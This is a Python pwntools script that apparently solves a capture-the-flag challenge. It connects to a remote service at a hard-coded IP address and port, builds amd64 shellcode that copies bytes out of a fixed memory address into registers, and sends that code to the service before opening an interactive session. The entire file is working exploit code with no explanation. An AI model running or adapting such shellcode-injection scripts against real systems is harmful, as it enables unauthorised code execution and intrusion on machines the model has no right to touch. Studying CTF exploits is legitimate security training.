#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'

# p = remote('localhost', 5566)
p = remote('52.192.42.215', 9427)

sc = asm('''
        mov r8, 0x2170000 # addr
        mov r9, [r8]      # *addr

        mov [r8 + 7], al
        mov rax, rdx
        mov [r8 + 6], al
        mov rax, rcx
        mov [r8 + 5], al
        mov rax, rbx
        mov [r8 + 4], al
        mov rax, rdi
        mov [r8 + 3], al
        mov rax, r15
        mov [r8 + 2], al
        mov rax, r14
        mov [r8 + 1], al
        mov rax, r13
        mov [r8], al
        mov rax, r12
        mov r8, 0x2170000

        mov r10, r9
        and r10, 0xff
label1:
        inc r12
        cmp r12, r10
        jne label1

        mov r10, r9
        shr r10, 8
        and r10, 0xff
label2:
        inc r13
        cmp r13, r10
        jne label2

        mov r10, r9
        shr r10, 16
        and r10, 0xff
label3:
        inc r14
        cmp r14, r10
        jne label3

        mov r10, r9
        shr r10, 24
        and r10, 0xff
label4:
        inc r15
        cmp r15, r10
        jne label4
        
        mov r10, r9
        shr r10, 32
        and r10, 0xff
label5:
        inc rdi
        cmp rdi, r10
        jne label5

        mov r10, r9
        shr r10, 40
        and r10, 0xff
label6:
        inc rbx
        cmp rbx, r10
        jne label6

        mov r10, r9
        shr r10, 48
        and r10, 0xff
label7:
        inc rcx
        cmp rcx, r10
        jne label7

        mov r10, r9
        shr r10, 56
        and r10, 0xff
label8:
        inc rdx
        cmp rdx, r10
        jne label8

        mov rax, 60 # exit
        syscall
        ''')
print(len(sc))
print(sc)

p.sendline(str(len(sc)).encode())
p.sendafter(b'..', sc)

p.interactive()
